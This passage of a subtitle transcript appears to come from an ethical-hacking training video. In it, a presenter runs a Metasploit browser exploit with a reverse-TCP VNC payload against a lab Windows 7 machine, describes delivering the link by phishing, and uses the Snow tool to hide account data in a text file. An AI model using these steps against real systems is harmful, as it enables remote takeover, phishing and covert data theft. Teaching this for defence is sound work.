00:09:32.516\ncan get for copy run and\nfrom the fact that you made it.\n\n211\n00:09:32.516 --> 00:09:34.156\n>> So stiffer.\n>> It's actually you can get more now.\n\n212\n00:09:34.156 --> 00:09:35.148\n>> Well.\n>> Yeah.\n\n213\n00:09:35.148 --> 00:09:37.198\nSo they recently changed\nthat here in US as well so\n\n214\n00:09:37.198 --> 00:09:38.130\n>> Kind of interesting\n\n215\n00:09:38.130 --> 00:09:38.917\n>> Yeah.\n\n216\n00:09:38.917 --> 00:09:39.664\n>> That that's been going on.\nIt's been over the news for\n\n217\n00:09:39.664 --> 00:09:42.036\nthe last couple of weeks.\nYou should probably get out more.\n\n218\n00:09:42.036 --> 00:09:42.972\n>> I should.\n[LAUGH]\n\n219\n00:09:42.972 --> 00:09:44.156\n>> Or perhaps, yeah.\n\n220\n00:09:44.156 --> 00:09:44.818\n>> [LAUGH]\n>> Not spend so\n\n221\n00:09:44.818 --> 00:09:46.325\nmuch time hanging out with me and\nmaybe do other stuff.\n\n222\n00:09:46.325 --> 00:09:47.820\nAnd that may actually explain that.\n\n223\n00:09:47.820 --> 00:09:48.722\n>> But that's no fun.\n\n224\n00:09:48.722 --> 00:09:50.450\n>> Alright, so we're gonna go ahead and\n\n225\n00:09:50.450 --> 00:09:53.380\nwhat we're gonna do now that we\nhave our list of exploits is.\n\n226\n00:09:53.380 --> 00:09:56.373\nWe want to choose the appropriate\nexploits so, I've gone ahead and\n\n227\n00:09:56.373 --> 00:09:57.379\ntyped in the command.\n\n228\n00:09:57.379 --> 00:09:59.098\nIt's called use exploits.\n\n229\n00:09:59.098 --> 00:10:01.590\nLet me just highlight it here so\nyou can see it.\n\n230\n00:10:01.590 --> 00:10:02.961\nAnd all I do is use export and\n\n231\n00:10:02.961 --> 00:10:05.955\nthen I name the exploit that I\nwant from the directory path.\n\n232\n00:10:05.955 --> 00:10:10.670\nSo in this case,\nwindows/browser/ms11_003_ie_css_import\n\n233\n00:10:10.670 --> 00:10:13.670\nwhatever, and\nthat's the one I'm gonna use.\n\n234\n00:10:13.670 --> 00:10:14.917\nSo I've gone ahead and pulled that in.\n\n235\n00:10:14.917 --> 00:10:16.410\nSo I've loaded that.\n\n236\n00:10:16.410 --> 00:10:20.109\nSo then what I have to do is I\nhave to set the payload for it.\n\n237\n00:10:20.109 --> 00:10:21.520\nSo next thing is.\n\n238\n00:10:21.520 --> 00:10:23.985\nWhoops.\nLet me kinda highlight here.\n\n239\n00:10:23.985 --> 00:10:25.199\nAnd I said the mouse would be easier.\n\n240\n00:10:25.199 --> 00:10:30.092\n[LAUGH] And so, the next thing I do after\nI choose what exploit I want to be able\n\n241\n00:10:30.092 --> 00:10:33.913\nto actually target is I'm gonna go in and\nset the payload.\n\n242\n00:10:33.913 --> 00:10:37.588\nSo I used the set payload command,\nand I'm using VNC inject, so\n\n243\n00:10:37.588 --> 00:10:40.800\nI'm gonna use VNC to be able\nto create a remote session.\n\n244\n00:10:40.800 --> 00:10:44.980\nSo I'm using set payload\nwindows/vnc/inject/reverse_tcp TCP, and\n\n245\n00:10:44.980 --> 00:10:50.150\nthen I'm gonna go in and once I've set\nthat, I then get the payload prompt,\n\n246\n00:10:50.150 --> 00:10:53.150\nand it tells me okay great I've\ngot VNC loaded up for Windows.\n\n247\n00:10:53.150 --> 00:10:54.470\nI'm gonna be able to do that.\n\n248\n00:10:54.470 --> 00:10:57.640\nI did a show options just to see what\noptions there in case I have to set some\n\n249\n00:10:57.640 --> 00:10:59.080\nstuff and Turns out I do.\n\n250\n00:10:59.080 --> 00:11:02.059\nI would obviously have to take a look,\nand kind of do a little digging,\n\n251\n00:11:02.059 --> 00:11:03.942\nsee what's got values, what's missing.\n\n252\n00:11:03.942 --> 00:11:06.486\nBut I'm gonna have to set the lhhost or\nlhost rather, and\n\n253\n00:11:06.486 --> 00:11:10.030\nI'm also gonna have to set the lport,\nlocalhost, local port switches.\n\n254\n00:11:10.030 --> 00:11:10.674\nSo I'm gonna do that.\n\n255\n00:11:10.674 --> 00:11:15.591\nSo I've gone ahead and I've gone once I\ndid show options, I could see them there.\n\n256\n00:11:15.591 --> 00:11:19.273\nAnd I can see you know the settings,\nare they required yes or no.\n\n257\n00:11:19.273 --> 00:11:20.365\nServe host required, yes.\n\n258\n00:11:20.365 --> 00:11:22.258\nServe port required, yes.\n\n259\n00:11:22.258 --> 00:11:26.016\nYou know that kind of thing so\nyou ought to be looking at all that.\n\n260\n00:11:26.016 --> 00:11:30.296\nAnd once all of its done and\nI've gone through everything, and\n\n261\n00:11:30.296 --> 00:11:34.435\nI've got L HOST down here,\nyes, required L port required.\n\n262\n00:11:34.435 --> 00:11:36.250\nAnd so I see that there may or\nmay not be a value.\n\n263\n00:11:36.250 --> 00:11:39.535\nIf I see a value with a required setting a\nyes and no value, then hey I've got to go\n\n264\n00:11:39.535 --> 00:11:42.738\ndo that because it's going to throw\nan error and tell me it's not ready to go.\n\n265\n00:11:42.738 --> 00:11:46.001\nSo I'm gonna go ahead and\nI'm gonna set that up.\n\n266\n00:11:46.001 --> 00:11:51.179\nAnd so once I've done all that I do a set\nhost, or a set LHOST rather, local host.\n\n267\n00:11:51.179 --> 00:11:54.820\nThat's the IP address of the attacker,\nmeaning of my box on cali.\n\n268\n00:11:54.820 --> 00:11:59.554\nSo I've done set LHOST,\nset local host to your IP address here.\n\n269\n00:11:59.554 --> 00:12:00.784\n230.227.\n\n270\n00:12:00.784 --> 00:12:05.430\nSo it echoes back, it says okay, LHOST\nprompt, it shows me what IP is set, great.\n\n271\n00:12:05.430 --> 00:12:08.536\nGot that, then what I have to\ndo is go ahead and set LPORT.\n\n272\n00:12:08.536 --> 00:12:09.590\nWhat port am I gonna use coming out?\n\n273\n00:12:09.590 --> 00:12:11.499\n443, great.\n\n274\n00:12:11.499 --> 00:12:12.203\nLet's do that.\n\n275\n00:12:12.203 --> 00:12:13.390\nSet LPORT 443.\n\n276\n00:12:13.390 --> 00:12:14.709\nWe got that going.\n\n277\n00:12:14.709 --> 00:12:18.762\nSo now that we've set all that,\nwe're essentially ready, right?\n\n278\n00:12:18.762 --> 00:12:23.082\nWe've essentially teed this up, and so\nwhat we're going to do now is we actually\n\n279\n00:12:23.082 --> 00:12:25.495\nhave to go ahead and\ntype in 'exploit,' and\n\n280\n00:12:25.495 --> 00:12:29.012\nwhen I type in 'exploit,'\nThe exploit is gonna run the module.\n\n281\n00:12:29.012 --> 00:12:30.222\nIn other words, this is gonna fire off.\n\n282\n00:12:30.222 --> 00:12:33.908\nIf you remember in some of\nthe prior demos that we did\n\n283\n00:12:33.908 --> 00:12:37.785\nin Cali when were using recon NG,\nit was run, right?\n\n284\n00:12:37.785 --> 00:12:38.938\nThe magic word was run.\n\n285\n00:12:38.938 --> 00:12:41.729\nMagic word in Cali is exploit,\ncuz we're doing exploits.\n\n286\n00:12:41.729 --> 00:12:43.689\nSo that's our action item.\n\n287\n00:12:43.689 --> 00:12:45.805\nor our safe word,\nas they have sometimes said.\n\n288\n00:12:45.805 --> 00:12:46.655\nWhat is your safe word?\n\n289\n00:12:46.655 --> 00:12:48.033\n>> Stop.\n\n290\n00:12:48.033 --> 00:12:53.821\n>> I am going to hit exploit here,\nso I am going to type \"exploit\".\n\n291\n00:12:53.821 --> 00:12:56.301\nWhen I do that, what I am going to get,\n\n292\n00:12:56.301 --> 00:13:00.971\nit takes just a second Is I'm gonna\nget started Reverse TCP Handler on.\n\n293\n00:13:00.971 --> 00:13:04.613\nExploit running as background job, so\nI've loaded the Exploit essentially in\n\n294\n00:13:04.613 --> 00:13:07.347\nthe memory, it's running as\na service in the background.\n\n295\n00:13:07.347 --> 00:13:12.118\nAnd now, it's started the Reverse Handler,\nso I'm essentially running that Exploit on\n\n296\n00:13:12.118 --> 00:13:14.644\nthat IP with that port number,\nwe can see that.\n\n297\n00:13:14.644 --> 00:13:15.609\nRunning here.\n\n298\n00:13:15.609 --> 00:13:17.942\nJust highlight that for you.\n\n299\n00:13:17.942 --> 00:13:19.029\nSo, there we go.\n\n300\n00:13:19.029 --> 00:13:20.124\nWe got that going.\n\n301\n00:13:20.124 --> 00:13:21.203\nSo that's good.\n\n302\n00:13:21.203 --> 00:13:23.020\nAnd then we've got this\nURL that we're given.\n\n303\n00:13:23.020 --> 00:13:28.512\nAnd we've gotta grab that URL and\nwe're gonna take that URL and we're\n\n304\n00:13:28.512 --> 00:13:35.235\ngonna then actually go enter that URL Into\nthe machine that we wanna actually target.\n\n305\n00:13:35.235 --> 00:13:38.871\nSo I'm gonna run over to my Windows\n7 machine and I'm gonna type that in.\n\n306\n00:13:38.871 --> 00:13:43.138\nSo I've gotta go ahead and\nI've got to do the following.\n\n307\n00:13:43.138 --> 00:13:44.660\nLet me see here.\n\n308\n00:13:44.660 --> 00:13:48.582\nSo I'm going to grab my local IP,\n\n309\n00:13:48.582 --> 00:13:54.194\nwhat is that HTTP,\nlet me just make a note here.\n\n310\n00:13:54.194 --> 00:13:56.309\nAnd can I borrow that for just a second?\n\n311\n00:13:56.309 --> 00:13:58.241\nI'm just going to write\nthis down real quick so\n\n312\n00:13:58.241 --> 00:14:00.980\nI can actually see it because I\ndidn't generate it ahead of time.\n\n313\n00:14:00.980 --> 00:14:02.996\nAnd that way we actually know what it is.\n\n314\n00:14:02.996 --> 00:14:06.781\nAnd when I got to type it in\nI can actually then use it.\n\n315\n00:14:06.781 --> 00:14:14.363\nSo, as the attacker you know I would\ntake this URL 230.227 on port 8080.\n\n316\n00:14:14.363 --> 00:14:18.909\nAnd then I need, what is that?\n\n317\n00:14:18.909 --> 00:14:20.861\nVG.\n\n318\n00:14:20.861 --> 00:14:26.841\n0pz5x.\n\n319\n00:14:26.841 --> 00:14:31.200\nAnd what I would have to do is,\nI would have to figure out a way for\n\n320\n00:14:31.200 --> 00:14:32.362\nthat to be used.\n\n321\n00:14:32.362 --> 00:14:36.106\nAnd so, most likely, I would send\nthis in an email of some kind.\n\n322\n00:14:36.106 --> 00:14:38.690\nI'd say okay hey, guess what everybody?\n\n323\n00:14:38.690 --> 00:14:40.042\nClick here to win a million dollars.\n\n324\n00:14:40.042 --> 00:14:41.661\nAnd whatever we're going to do to phish,\nright?\n\n325\n00:14:41.661 --> 00:14:46.339\nBut the point is that I would hide\nthis thought by obfuscating the URL,\n\n326\n00:14:46.339 --> 00:14:47.775\nwhat it resolves to.\n\n327\n00:14:47.775 --> 00:14:49.239\nYou did that a whole 100 thing to show,\nright?\n\n328\n00:14:49.239 --> 00:14:54.786\nAnd so, I would try to trick people with\nthis URL into actually exploiting it,\n\n329\n00:14:54.786 --> 00:14:55.890\nby running it.\n\n330\n00:14:55.890 --> 00:14:58.854\nNow, we're not gonna just say,\nno I need that attribute, right?\n\n331\n00:14:58.854 --> 00:15:01.434\nWe're not gonna say, take it away,\nit's not gonna be as much fun of a demo,\n\n332\n00:15:01.434 --> 00:15:02.660\nnot being able to see anything.\n\n333\n00:15:02.660 --> 00:15:05.060\nSo we would obviously try\nto get people to do this.\n\n334\n00:15:05.060 --> 00:15:07.460\nSo I've got a Windows 7\nmachine already set up,\n\n335\n00:15:07.460 --> 00:15:10.900\nright, through the magic of three\nfinger sliding here on the Apple.\n\n336\n00:15:10.900 --> 00:15:11.900\nI'm gonna go ahead and go over there.\n\n337\n00:15:11.900 --> 00:15:13.120\n>> You better get used to it.\n\n338\n00:15:13.120 --> 00:15:14.730\n>> Yeah, no, thank you very much.\n\n339\n00:15:14.730 --> 00:15:15.870\nAbsolutely not.\n\n340\n00:15:15.870 --> 00:15:19.140\nAnd so what I'm gonna do is I'm gonna go\nahead and I'm gonna type this, and now,\n\n341\n00:15:19.140 --> 00:15:22.110\nin the real world, we would get\nsomebody to click on this link-through\n\n342\n00:15:22.110 --> 00:15:23.760\nin the emails we were talking about.\n\n343\n00:15:23.760 --> 00:15:26.850\nHere for the sake of time and\nbrevity we're just going to go ahead and\n\n344\n00:15:26.850 --> 00:15:30.430\ntype it in, and we're not obviously\ngoing to rely on somebody doing this.\n\n345\n00:15:30.430 --> 00:15:33.250\nBut you know, obviously,\nthere would be a lot of ways for\n\n346\n00:15:33.250 --> 00:15:35.920\nthis to potentially be brought over,\nright?\n\n347\n00:15:35.920 --> 00:15:38.931\nAnd so I think that was an O.\n\n348\n00:15:41.385 --> 00:15:46.400\nHold on one second, let's double check,\nO P, yeah, okay, just wanted to make sure.\n\n349\n00:15:46.400 --> 00:15:53.180\nOkay, there we go, so that was OP, and\nthen that was a z5 and an x, right?\n\n350\n00:15:53.180 --> 00:15:57.000\nAll right, so we're gonna do that,\n\n351\n00:15:57.000 --> 00:16:00.160\nnow what we get basically is\njust a blank shell here, right?\n\n352\n00:16:00.160 --> 00:16:01.589\nI mean, literally, it's just a blank page.\n\n353\n00:16:01.589 --> 00:16:04.513\nThere's nothing there, which is fine\nbecause we don't expect anything.\n\n354\n00:16:04.513 --> 00:16:06.808\nIt's exactly what we would assume.\n\n355\n00:16:06.808 --> 00:16:08.431\nWhat would happen, right?\n\n356\n00:16:08.431 --> 00:16:10.746\nThe user clicks,\nthere's nothing going on, right?\n\n357\n00:16:10.746 --> 00:16:14.184\nOr it must be a mistake, let me try that,\nmaybe they click a couple of times.\n\n358\n00:16:14.184 --> 00:16:20.755\nBut what actually should happen is\nthat we should be able to get a,\n\n359\n00:16:20.755 --> 00:16:27.045\nlet me see, there's a did start local,\nlaunch VNC viewer.\n\n360\n00:16:27.045 --> 00:16:28.905\nOkay, so we did get VNC viewer to come up.\n\n361\n00:16:28.905 --> 00:16:32.025\nYou see down here at the bottom\nI've got the VNC viewer launched,\n\n362\n00:16:32.025 --> 00:16:32.895\nright there, right.\n\n363\n00:16:32.895 --> 00:16:36.220\nIt did launch the viewer,\nit killed the connection for me,\n\n364\n00:16:36.220 --> 00:16:38.270\nI probably wasn't quick enough\nto come back and see it.\n\n365\n00:16:38.270 --> 00:16:41.350\nSo it just timed out, but\nessentially the VNC Viewer launches.\n\n366\n00:16:41.350 --> 00:16:45.380\nWhich means I was able to launch\nVNC Viewer on the machine, and\n\n367\n00:16:45.380 --> 00:16:46.990\nI was able to essentially get in and\ntake control.\n\n368\n00:16:46.990 --> 00:16:49.030\nOr at least, had I been quick and\ncome back, and\n\n369\n00:16:49.030 --> 00:16:50.341\nI'd been there to exploit it, right?\n\n370\n00:16:50.341 --> 00:16:51.683\nI would have seen it pop up.\n\n371\n00:16:51.683 --> 00:16:54.070\nCuz I was taking my time and\ndouble checking what it was, and\n\n372\n00:16:54.070 --> 00:16:55.320\nI wasn't paying attention.\n\n373\n00:16:55.320 --> 00:16:56.290\nI didn't come back quick enough.\n\n374\n00:16:56.290 --> 00:16:58.820\nBut you can see that I was\nable to actually get in, and\n\n375\n00:16:58.820 --> 00:17:00.630\nI was able to actually launch VNC.\n\n376\n00:17:00.630 --> 00:17:04.460\nAnd so, this allows me to\nuse the tight VNC window,\n\n377\n00:17:04.460 --> 00:17:07.820\nsmall VNC server that's running\nto launch a remote console and\n\n378\n00:17:07.820 --> 00:17:13.140\nthen potentially exploit the Windows\n7 machine right through that window.\n\n379\n00:17:13.140 --> 00:17:18.491\nYou can see here it's just\nsetting there as an empty shell.\n\n380\n00:17:18.491 --> 00:17:21.802\nBut the reality is that once I load it and\nlaunch it,\n\n381\n00:17:21.802 --> 00:17:25.504\nit would allow me to potentially\ncompromise the system.\n\n382\n00:17:25.504 --> 00:17:29.436\nSo being able to use this can potentially,\n\n383\n00:17:29.436 --> 00:17:34.550\nthrough the exploit,\nallow me to actually take over a machine.\n\n384\n00:17:34.550 --> 00:17:35.110\n>> Wow.\n\n385\n00:17:35.110 --> 00:17:39.610\n>> And we would have targeting, obviously,\nspecific to certain systems, right?\n\n386\n00:17:39.610 --> 00:17:42.150\nSo we'd have to find\nthe appropriate exploit and\n\n387\n00:17:42.150 --> 00:17:45.690\nmake sure that we're aware of the fact\nthat there may be one for Windows 10.\n\n388\n00:17:45.690 --> 00:17:47.240\nThere may be one for Windows 8.\n\n389\n00:17:47.240 --> 00:17:49.720\nIt depends on the vulnerabilities\nin the browser.\n\n390\n00:17:49.720 --> 00:17:51.702\nSo we'd have to think about that,\nobviously, and\n\n391\n00:17:51.702 --> 00:17:53.510\nwant to just consider\nwhat's going on there.\n\n392\n00:17:53.510 --> 00:17:55.980\nBut I could go in and\nI could take advantage of this, and\n\n393\n00:17:55.980 --> 00:17:57.930\nthen load up a remote exploit.\n\n394\n00:17:57.930 --> 00:18:02.030\nAnd having done that,\nI'd be off to the races, as it were.\n\n395\n00:18:02.030 --> 00:18:04.710\nSo we can use KALI for\nall sorts of stuff, right?\n\n396\n00:18:04.710 --> 00:18:05.660\nIt's just one example,\n\n397\n00:18:05.660 --> 00:18:09.410\nwe have all sorts of exploits, and\nthere's 1,500 of them that we could use.\n\n398\n00:18:09.410 --> 00:18:12.000\nBut think about this, I mean, think about\nwhat you could do with this, right?\n\n399\n00:18:12.000 --> 00:18:12.660\n>> Yeah, absolutely.\n\n400\n00:18:12.660 --> 00:18:14.430\n>> Potentially taking\ncontrol of a local machine.\n\n401\n00:18:14.430 --> 00:18:18.940\n>> And how hard is it to really to get\nsomebody to click on a link in an e-mail?\n\n402\n00:18:18.940 --> 00:18:23.820\nWe all know it's not very difficult\nwith the right, what do we wanna say?\n\n403\n00:18:23.820 --> 00:18:25.810\nThe right social engineering, right?\n\n404\n00:18:25.810 --> 00:18:29.510\nWhere you either put a link in there that\nsays, like Adam says, you won money, or\n\n405\n00:18:29.510 --> 00:18:32.420\nclick here to install this free software.\n\n406\n00:18:32.420 --> 00:18:35.290\nOr, hey,\nhere's that link you were asking me for.\n\n407\n00:18:35.290 --> 00:18:37.620\nI didn't ask anybody for a link,\nI'm wondering what it is.\n\n408\n00:18:37.620 --> 00:18:40.570\nClick, click, so\nwe can get that done pretty easy.\n\n409\n00:18:40.570 --> 00:18:41.400\n>> We could actually.\n\n410\n00:18:41.400 --> 00:18:45.090\nYou could see it doesn't take that\nlong potentially to set something like\n\n411\n00:18:45.090 --> 00:18:45.610\nthis up either.\n\n412\n00:18:45.610 --> 00:18:49.640\nThat's really the interesting part is,\nI took my time, I preloaded stuff for\n\n413\n00:18:49.640 --> 00:18:50.910\nyou, I talked you through it.\n\n414\n00:18:50.910 --> 00:18:53.240\nBut if I'm sitting there actually\ndoing this in real time, and\n\n415\n00:18:53.240 --> 00:18:56.260\nI know what I'm doing, and\nI've already got my target picked out,\n\n416\n00:18:56.260 --> 00:18:59.780\nit may take my five or 10 minutes to just\ntee everything up, make sure I'm good.\n\n417\n00:18:59.780 --> 00:19:00.751\nSend out the e-mail,\n\n418\n00:19:00.751 --> 00:19:04.920\nso obviously wait who knows how long till\nwe actually get somebody to click in.\n\n419\n00:19:04.920 --> 00:19:07.890\nBut once we start seeing the sessions come\nin, I'm gonna start seeing those windows\n\n420\n00:19:07.890 --> 00:19:10.000\npop up and\nI can start grabbing those machines.\n\n421\n00:19:10.000 --> 00:19:12.605\nAnd could be minutes, could be hours,\nbut it doesn't take maybe five,\n\n422\n00:19:12.605 --> 00:19:15.410\n10 minutes at the most to\nactually set it up ahead of time.\n\n423\n00:19:15.410 --> 00:19:18.390\nSo that is something just to consider and\nthink about, right?\n\n424\n00:19:18.390 --> 00:19:19.600\n>> Yeah.\n>> So I'm gonna set up for\n\n425\n00:19:19.600 --> 00:19:21.070\nanother little demo here.\n\n426\n00:19:21.070 --> 00:19:23.720\nAll right, so now we're gonna\nswitch over to the Windows box.\n\n427\n00:19:23.720 --> 00:19:26.460\nLet me just swipe over here if I\ncan manage that three finger thing\n\n428\n00:19:26.460 --> 00:19:27.370\nthat Mike showed me.\n\n429\n00:19:27.370 --> 00:19:28.430\nWe're gonna go over to Windows.\n\n430\n00:19:28.430 --> 00:19:31.630\nLet's take a look at a couple of\nthe exploits on the Window's side.\n\n431\n00:19:31.630 --> 00:19:35.480\nWe were just looking at how it can\nuse KALI to, through metasploid,\n\n432\n00:19:35.480 --> 00:19:39.305\ncreate a VMC exploitation\nagainst Windows 7, right?\n\n433\n00:19:39.305 --> 00:19:41.800\nTo take over the box so\nthat was kinda cool.\n\n434\n00:19:41.800 --> 00:19:42.530\nBut let's go ahead and\n\n435\n00:19:42.530 --> 00:19:44.520\ntake a look at some of the other\nthings we've talked about here.\n\n436\n00:19:44.520 --> 00:19:48.340\nSo, I thought we'd jump into\nquickly a demo on steganography.\n\n437\n00:19:48.340 --> 00:19:51.660\nAnd we mentioned that, prior episode,\nwe talked about what we could do there.\n\n438\n00:19:51.660 --> 00:19:54.670\nWe did the cool ADS\nalternate data stream thing.\n\n439\n00:19:54.670 --> 00:19:58.782\nWe kinda bound the calculator\nexecutable into the word, or excuse me,\n\n440\n00:19:58.782 --> 00:20:02.426\nthe notepad doc, and then we went and\nexecuted it and did that.\n\n441\n00:20:02.426 --> 00:20:04.600\nSo another take on this.\n\n442\n00:20:04.600 --> 00:20:06.261\nOne of the many programs out there.\n\n443\n00:20:06.261 --> 00:20:10.146\nThis is an oldie, but again I like\nthe command line versions from these cuz\n\n444\n00:20:10.146 --> 00:20:14.280\nthey're easier to work with,\nat least I think they are anyway.\n\n445\n00:20:14.280 --> 00:20:15.485\nNot everybody.\n\n446\n00:20:15.485 --> 00:20:20.087\nBut Snow, which one of these\nis old school crypto, or\n\n447\n00:20:20.087 --> 00:20:23.950\nif it's an old school\n>> Steganography programs.\n\n448\n00:20:23.950 --> 00:20:26.877\nWhat we're gonna do is we loaded this up,\n\n449\n00:20:26.877 --> 00:20:31.990\nthanks to Mr Nate who runs our software\nacquisition program at ITProTV.\n\n450\n00:20:31.990 --> 00:20:34.060\n>> We don't ask questions,\nwe just [LAUGH].\n\n451\n00:20:34.060 --> 00:20:35.600\n>> Nate just shows up.\n\n452\n00:20:35.600 --> 00:20:39.167\nI gave Nate a shopping list before we\ngot the whole set of episode's together,\n\n453\n00:20:39.167 --> 00:20:43.050\nhe was kind enough to go out and just get\nall the software together for our demos.\n\n454\n00:20:43.050 --> 00:20:44.360\nSo I wanna thank him for that.\n\n455\n00:20:44.360 --> 00:20:47.910\nSo he put together a little ISO,\nwe loaded it up, we grabbed Snow,\n\n456\n00:20:47.910 --> 00:20:51.242\nwe just exploded it out,\nit comes down as a ZIP file.\n\n457\n00:20:51.242 --> 00:20:55.030\nAnd so,ve just gone into the directory\nwhere I created it, so it's sitting there,\n\n458\n00:20:55.030 --> 00:20:58.420\nyou can see, on the desktop,\nin Desktop and the Snow directory.\n\n459\n00:20:58.420 --> 00:21:00.640\nSo I always just try to\nlaunch the help files so\n\n460\n00:21:00.640 --> 00:21:04.200\nyou guys can see what those switches look\nlike that we're gonna use in the demo.\n\n461\n00:21:04.200 --> 00:21:07.734\nSo I just went ahead and\ndid Snow/?, show me the help file.\n\n462\n00:21:07.734 --> 00:21:11.562\nAnd then we get, you'll see usage,\nI love the fact it says illegal option.\n\n463\n00:21:11.562 --> 00:21:15.390\nNo, I can't show you anything with help,\nthen it puts the help file up anyway.\n\n464\n00:21:15.390 --> 00:21:17.790\n>> [LAUGH]\n>> You gotta love people.\n\n465\n00:21:17.790 --> 00:21:20.470\nSo literally, it does this, right?\n\n466\n00:21:20.470 --> 00:21:22.140\nRight here, just point out the obvious.\n\n467\n00:21:22.140 --> 00:21:25.630\nSo that's illegal, it can't do that,\nbut yet it will list the help file for\n\n468\n00:21:25.630 --> 00:21:26.421\nme right afterwards, right?\n\n469\n00:21:26.421 --> 00:21:28.062\n>> [LAUGH]\n>> So, good, so, anyway.\n\n470\n00:21:28.062 --> 00:21:29.171\nSo we got snow.\n\n471\n00:21:29.171 --> 00:21:34.733\nSo, you see -C, -Q, -S, -p for\npassword, -m for message.\n\n472\n00:21:34.733 --> 00:21:40.230\nSo what I then did was I went ahead and\nI did the following, I ran snow.exe.\n\n473\n00:21:40.230 --> 00:21:46.360\nSo I'm gonna run the executable\nright form within the directory.\n\n474\n00:21:46.360 --> 00:21:47.512\nThen capital C, right?\n\n475\n00:21:47.512 --> 00:21:49.900\nSo I'm gonna use that.\n\n476\n00:21:49.900 --> 00:21:53.310\nSwitch lowercase M for\nMy account is whatever,\n\n477\n00:21:53.310 --> 00:21:55.620\nthat's my message that\nI wanna put in there.\n\n478\n00:21:55.620 --> 00:21:56.980\nSo I'm gonna run that.\n\n479\n00:21:56.980 --> 00:22:00.160\nAnd then, I set my message for my\naccount number from my bank is whatever.\n\n480\n00:22:00.160 --> 00:22:02.610\nSo I've put some secret\ninformation in there.\n\n481\n00:22:02.610 --> 00:22:03.740\nPut a password on it.\n\n482\n00:22:05.000 --> 00:22:06.630\nPassword is the string magic.\n\n483\n00:22:06.630 --> 00:22:10.530\nAnd then, I asked it to take the readme\ntext file, which I had already created,\n\n484\n00:22:10.530 --> 00:22:12.020\nI'll show it to you in a minute.\n\n485\n00:22:12.020 --> 00:22:16.230\nAnd I asked it to essentially copy the\nreadme text file, create a new file called\n\n486\n00:22:16.230 --> 00:22:20.360\nreadme2, but to stego the data that I've\njust put in the string, my password, or\n\n487\n00:22:20.360 --> 00:22:24.290\nrather my account number is whatever,\nand put it in there.\n\n488\n00:22:24.290 --> 00:22:26.740\nSo I've already got a README text file,\nright?\n\n489\n00:22:26.740 --> 00:22:29.090\nSo we can see here README was created.\n\n490\n00:22:29.090 --> 00:22:31.713\nYou can see the timestamp\nwas created at 12:32,\n\n491\n00:22:31.713 --> 00:22:35.642\na couple of minutes before I ran the demo\nto do the creation of README2, right?\n\n492\n00:22:35.642 --> 00:22:36.610\nSo README,\n\n493\n00:22:36.610 --> 00:22:40.250\nthe text file README, says here is my\ninfo with a little line in it, right?\n\n494\n00:22:40.250 --> 00:22:42.900\nJust nothing of any consequence.\n\n495\n00:22:42.900 --> 00:22:47.110\nAnd then I go ahead and I copy essentially\nstegoing the new data into it.\n\n496\n00:22:47.110 --> 00:22:48.700\nAnd I create it as README2.\n\n497\n00:22:48.700 --> 00:22:50.570\nYou'll see, notice by the way,\nsame time, or\n\n498\n00:22:50.570 --> 00:22:52.880\nrather a two minute different time stamp,\nsame size, right?\n\n499\n00:22:52.880 --> 00:22:53.470\n>> Same size, okay.\n\n500\n00:22:53.470 --> 00:22:56.010\n>> Right?\nSo when I do README2, README2,\n\n501\n00:22:56.010 --> 00:22:59.020\nnotice the name up there,\nsame exact look and\n\n502\n00:22:59.020 --> 00:23:02.090\nfeel as the original file\nexcept it's actually not.\n\n503\n00:23:02.090 --> 00:23:06.370\nBecause what I have,\njust center this, so what I have now\n\n504\n00:23:06.370 --> 00:23:10.250\nat the end of this is I've gone ahead,\nmessage exceeds available space, whatever,\n\n505\n00:23:10.250 --> 00:23:13.100\nthat's fine, but\nan extra six lines were added.\n\n506\n00:23:13.100 --> 00:23:14.670\nIt actually adds that data in.\n\n507\n00:23:14.670 --> 00:23:19.110\nSo then, if I wanna actually see\nwhat's in the file I can use\n\n508\n00:23:19.110 --> 00:23:24.300\nthe following command line here, provide\nthe password, tell it the file name.\n\n509\n00:23:24.300 --> 00:23:27.720\nSo when I do that,\nit goes ahead as you can see, and\n\n510\n00:23:27.720 --> 00:23:31.200\nit brings up the data that I\nput into the README2 file.\n\n511\n00:23:31.200 --> 00:23:34.060\nSo my account number for\nmy bank is, I just did a string,\n\n512\n00:23:34.060 --> 00:23:35.870\n1 through zero, all the way through.\n\n513\n00:23:35.870 --> 00:23:37.850\nBut you can imagine I could\nput anything in there.\n\n514\n00:23:37.850 --> 00:23:40.310\nSo to the naked eye,\nto the untrained observer,\n\n515\n00:23:40.310 --> 00:23:44.511\nto somebody who doesn't know that the file\nhas been stegonographically altered,\n\n516\n00:23:44.511 --> 00:23:48.844\nI've got this seemingly innocuous text\nfile that actually looks like that, right?\n\n517\n00:23:48.844 --> 00:23:53.603\nBut the reality is,\nthat what's really in there but\n\n518\n00:23:53.603 --> 00:23:58.468\nis hidden, if I can just do it this way,\nis this line of\n\n519\n00:23:58.468 --> 00:24:03.666\ndata right there.\n\n520\n00:24:03.666 --> 00:24:04.675\n>> Yeah.\n\n521\n00:24:04.675 --> 00:24:07.419\nOr this line of data\nright here I should say,\n\n522\n00:24:07.419 --> 00:24:11.150\nis what actually is sitting\nthere in the file as well.\n\n523\n00:24:11.150 --> 00:24:15.140\n>> Yeah, I mean, that's fantastic because\nyou think, even if somebody took the time,\n\n524\n00:24:15.140 --> 00:24:17.420\nyou had a thumb drive on you,\nand they popped it in and\n\n525\n00:24:17.420 --> 00:24:18.330\nthey're looking at your files.\n\n526\n00:24:18.330 --> 00:24:21.910\nAnd even if they opened up the files,\nthey're not gonna see anything wrong.\n\n527\n00:24:21.910 --> 00:24:25.350\nThe files have no data in there that\nmaybe shouldn't leave the company\n\n528\n00:24:25.350 --> 00:24:25.965\ngrounds, right?\n\n529\n00:24:25.965 --> 00:24:27.733\nBut unbeknownst to them-\n>> To the untrained observer,\n\n530\n00:24:27.733 --> 00:24:30.000\nnow there's somebody\nwho's casually looking.\n\n531\n00:24:30.000 --> 00:24:31.937\nOr even somebody who's\nreally hardcore looking, but\n\n532\n00:24:31.937 --> 00:24:34.169\ndoesn't know the file's been\nsteganographically altered,\n\n533\n00:24:34.169 --> 00:24:36.283\nthey're not gonna find any\nevidence of anything in there.\n\n534\n00:24:36.283 --> 00:24:36.861\n>> Absolutely.\n>> So\n\n535\n00:24:36.861 --> 00:24:38.961\nas far as I'm concerned,\nI'm calm and cool, right?\n\n536\n00:24:38.961 --> 00:24:41.620\nBecause I'm walking through security and\neverything's good.\n\n537\n00:24:41.620 --> 00:24:43.430\nSo I'll tell you a real\nworld story about this.\n\n538\n00:24:43.430 --> 00:24:45.423\nSo I've mentioned probably\nin some of our other,\n\n539\n00:24:45.423 --> 00:24:47.748\nI don't know 